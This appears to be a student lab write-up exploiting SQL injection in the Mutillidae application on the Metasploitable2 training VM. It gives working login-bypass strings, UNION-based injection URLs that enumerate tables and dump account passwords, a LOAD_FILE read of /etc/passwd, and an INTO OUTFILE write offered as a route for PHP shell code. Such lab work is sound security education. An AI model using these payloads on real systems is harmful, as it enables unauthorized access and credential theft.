## sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/0f442b99-cec1-46ab-b92a-fd935c14d155)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/cda80948-b221-48d1-8b8e-152e1b3575a1)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/85d81817-a933-4560-973d-aa018349e396)
Click on the menu Login/Register and register for an account
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/6170c779-8ebf-49cf-9db3-8ba0ae6c594d)
Click on the link “Please register here”
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/148c315d-7fd2-44cf-8701-3b94831734ea)
Click on “Create Account” to display the following page:
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/eef32cd5-9b99-4baf-968d-8bc745519c0e)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/de2a8dfa-0474-4407-b55c-2c42b0e5fde7)

Click “Login”. The logged in page will show as below:
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/56457512-0052-48b9-808d-7643da6e0e31)

## Bypassing logi field
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”
Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/a5e688da-83c2-449c-bc5b-22cea6ab3c5b)

Click the login button and you will see it enter into the administrator page
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/3238da4a-7109-47c7-943e-d3545180e54d)

## Union-based SQL Injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/582cd825-53cf-402d-895f-75ba26e78067)

![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/0826dcd3-9aff-4a9b-bc84-d44e29faa997)

![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/b7f22171-e0cc-4b10-aebf-3af394c228f1)

![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/c3544ccf-30d3-42e3-8df1-3ce7f687d8b0)

![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/d81b075d-2b03-4322-9b74-28781aa5bdb4)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/2b625399-4b20-4bb1-a2ae-1241fb5c2736)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below: 
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/71e0be6b-c248-4186-8149-a09da980c988)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/c6feb4c5-aec2-47b5-8adc-5b0060b69dfd)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/f5482603-0d36-4349-9444-628dc0735ed9)
As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/95625ee8-d07e-45f2-8ffe-e8727d69c683)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/f94c667b-d550-4386-a842-a84c3e1f7a90)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/92939051-bb61-4163-87dd-c66c7b757926)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/c28884d3-84e5-4d7c-8dfb-bb3856bd28c7)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/d3390b08-a9ae-474c-98dd-1a058de73430)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/d8f7d2be-5816-438f-852f-39c7a4ad6daa)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/507a8789-fcdc-4f66-89d0-34400df6eb25)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/7e5198c8-3c20-4437-bc2c-e9596fb227e9)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/1db9ea12-c0eb-4709-91ca-4323365b2608)
Reading and writing files on the web-server We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/karthika28112004/sqlinjection/assets/128035087/69e225a5-35b7-4cf4-ad31-4a668d3a5725)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
